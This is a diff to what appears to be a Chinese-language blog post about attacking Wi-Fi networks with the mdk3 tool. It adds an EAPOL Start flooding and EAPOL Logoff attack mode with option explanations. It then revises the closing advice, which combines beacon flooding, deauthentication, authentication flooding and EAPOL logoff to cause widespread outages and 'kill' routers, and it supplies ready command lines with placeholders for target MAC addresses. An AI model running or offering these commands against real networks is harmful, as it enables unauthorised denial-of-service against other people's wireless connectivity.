@@ -162,12 +162,35 @@ Deauthentication/Disassociation Amok：<br />
 </code></pre>
 </div>
 
+<p>第四种模式：<br />
+802.1X test:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>mdk3 mon0 x  
+      0 - EAPOL Start packet flooding   #EAPOL格式的报文洪水攻击
+
+            -n &lt;ssid&gt;               
+            -t &lt;bssid&gt;        #目标客户端的mac地址               
+
+            -w &lt;WPA type&gt;
+               Set WPA type (1: WPA, 2: WPA2/RSN; default: WPA)
+            -u &lt;unicast cipher&gt;
+               Set unicast cipher type (1: TKIP, 2: CCMP; default: TKIP)
+            -m &lt;multicast cipher&gt;
+               Set multicast cipher type (1: TKIP, 2: CCMP; default: TKIP)
+            -s &lt;pps&gt;      #速率，默认400               
+      1 - EAPOL Logoff test       #注销认证攻击
+            -t &lt;bssid&gt;        #目标客户端的mac地址             
+            -c &lt;bssid&gt;         #目标ap的合法客户端mac               
+            -s &lt;pps&gt;         #速率，默认400               
+</code></pre>
+</div>
+
 <p>最后，建议这样攻击：<br />
-第一种和第三种同时使用会造成大面积间歇性断网，第二种可以配合之前扫描到的路由器进行攻击，威力无比<br />
+第一种和第三种同时使用会造成大面积间歇性断网，第二种可以配合第四种进行攻击，会导致路由器死亡<br />
 分别是</p>
 <div class="highlighter-rouge"><pre class="highlight"><code>./mdk3 mon0 b
 ./mdk3 mon0 d -s 120
-./mdk3 mon0 a -a {你要攻击的路由器MAC（BSS）}
+./mdk3 mon0 a -a {你要攻击的路由器MAC(BSS)}
+./mdk3 mon0 x 1 -c {客户端MAC(虚拟)} -t {路由器MAC(BSS)}
 </code></pre>
 </div>
 
